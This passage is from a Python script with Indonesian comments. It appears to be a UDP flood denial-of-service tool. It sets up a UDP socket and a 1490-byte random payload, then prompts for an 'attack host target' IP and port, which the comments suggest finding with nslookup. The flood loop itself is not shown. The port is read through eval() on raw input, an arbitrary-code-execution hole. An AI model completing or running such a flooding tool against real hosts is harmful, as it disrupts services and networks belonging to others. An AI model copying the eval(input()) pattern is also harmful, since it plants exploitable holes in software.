...
#Mari kita definisikan kaus kaki dan byte
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Ketik ip dan nomor port Anda (temukan alamat IP menggunakan nslookup atau situs web online apa pun) 
ip = input("Enter Attack Host Target : ")
port = eval(input("Enter Attack Port Target      : "))
